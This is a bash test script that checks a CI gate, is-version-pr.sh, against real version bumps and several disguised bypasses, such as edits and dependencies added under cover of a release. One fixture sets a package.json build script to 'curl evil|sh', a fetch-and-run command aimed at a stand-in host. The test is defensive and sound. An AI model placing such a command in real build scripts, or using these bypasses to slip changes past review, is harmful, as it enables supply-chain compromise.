#!/usr/bin/env bash
# Builds a throwaway git repo and asserts is-version-pr.sh against it.
#
# is-version-pr.sh is a security gate -- it decides which commits may skip the
# changeset requirement -- so its bypasses are worth testing directly rather
# than inferring from a green pipeline.
set -euo pipefail

LIB="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/is-version-pr.sh"
PASS=0
FAIL=0

# Runs one case: builds a repo, applies $2 as the "change", checks the verdict.
#
# $1 name, $2 function applying the change, $3 expected (version|normal)
check() {
  local name="$1" apply="$2" expect="$3"
  local dir
  dir="$(mktemp -d "${TMPDIR:-/tmp}/isvpr.XXXXXX")"

  (
    cd "$dir"
    git init -q .
    git config user.email t@example.com
    git config user.name t
    git config commit.gpgsign false

    mkdir -p .changeset packages/a
    printf '{\n  "name": "root",\n  "version": "1.0.0",\n  "scripts": {\n    "build": "tsc"\n  }\n}\n' > package.json
    echo '# Changelog' > CHANGELOG.md
    printf '{\n  "name": "@s/a",\n  "version": "1.0.0",\n  "dependencies": {\n    "@s/b": "1.0.0"\n  }\n}\n' > packages/a/package.json
    echo 'x' > .changeset/existing.md
    echo 'src' > src.ts
    git add -A
    git commit -qm base

    "$apply"

    git add -A
    git commit -qm change
  )

  # stderr is captured rather than discarded: a crash and a legitimate
  # "not a version bump" both exit non-zero, and silencing them makes the
  # first look like the second.
  local got err
  err="$(cd "$dir" && "$LIB" HEAD~1 2>&1 >/dev/null)" && got=version || got=normal

  if [[ "$got" == "$expect" ]]; then
    printf '  ok    %-44s %s\n' "$name" "$got"
    PASS=$((PASS + 1))
  else
    printf '  FAIL  %-44s expected %s, got %s\n' "$name" "$expect" "$got"
    [[ -n "$err" ]] && printf '        stderr: %s\n' "$err"
    FAIL=$((FAIL + 1))
  fi

  rm -rf "$dir"
}

# --- the real version bump, single package -------------------------------
single_bump() {
  printf '{\n  "name": "root",\n  "version": "1.1.0",\n  "scripts": {\n    "build": "tsc"\n  }\n}\n' > package.json
  printf '# Changelog\n\n## 1.1.0\n\n- thing\n' > CHANGELOG.md
  rm .changeset/existing.md
}

# --- monorepo bump: nested package.json + internal dependency rewrite -----
mono_bump() {
  printf '{\n  "name": "@s/a",\n  "version": "1.1.0",\n  "dependencies": {\n    "@s/b": "1.1.0"\n  }\n}\n' > packages/a/package.json
  printf '# Changelog\n\n## 1.1.0\n\n- thing\n' > packages/a/CHANGELOG.md
  rm .changeset/existing.md
}

# --- the bypasses this gate exists to stop -------------------------------
# Deleting changesets and touching the changelog, without bumping a version.
no_version_bump() {
  printf '# Changelog\n\n## sneaky\n' > CHANGELOG.md
  rm .changeset/existing.md
}

# A source edit riding along with a genuine bump.
bump_plus_source() {
  single_bump
  echo 'evil' > src.ts
}

# A scripts edit hidden in a package.json that also bumps its version.
bump_plus_script() {
  printf '{\n  "name": "root",\n  "version": "1.1.0",\n  "scripts": {\n    "build": "curl evil|sh"\n  }\n}\n' > package.json
  printf '# Changelog\n\n## 1.1.0\n\n- thing\n' > CHANGELOG.md
  rm .changeset/existing.md
}

# An external dependency added under cover of a version bump. `changeset
# version` only ever rewrites existing ranges, so an added or removed entry is
# not something it produces and must not be waved through.
bump_plus_dependency() {
  printf '{\n  "name": "@s/a",\n  "version": "1.1.0",\n  "dependencies": {\n    "@s/b": "1.1.0",\n    "evil": "*"\n  }\n}\n' > packages/a/package.json
  printf '# Changelog\n\n## 1.1.0\n\n- thing\n' > packages/a/CHANGELOG.md
  rm .changeset/existing.md
}

# No changesets deleted: an ordinary change that happens to touch the changelog.
changelog_only() {
  printf '# Changelog\n\n- note\n' > CHANGELOG.md
}

# A plain feature change.
feature() {
  echo 'feature' > src.ts
}

echo 'is-version-pr.sh'
check 'single-package version bump'        single_bump          version
check 'monorepo bump with dep rewrite'     mono_bump            version
check 'changesets deleted, no version bump' no_version_bump     normal
check 'version bump + source edit'         bump_plus_source     normal
check 'version bump + scripts edit'        bump_plus_script     normal
check 'version bump + added dependency'    bump_plus_dependency normal
check 'changelog edit alone'               changelog_only       normal
check 'ordinary feature change'            feature              normal

echo
echo "  ${PASS} passed, ${FAIL} failed"
[[ "$FAIL" -eq 0 ]]
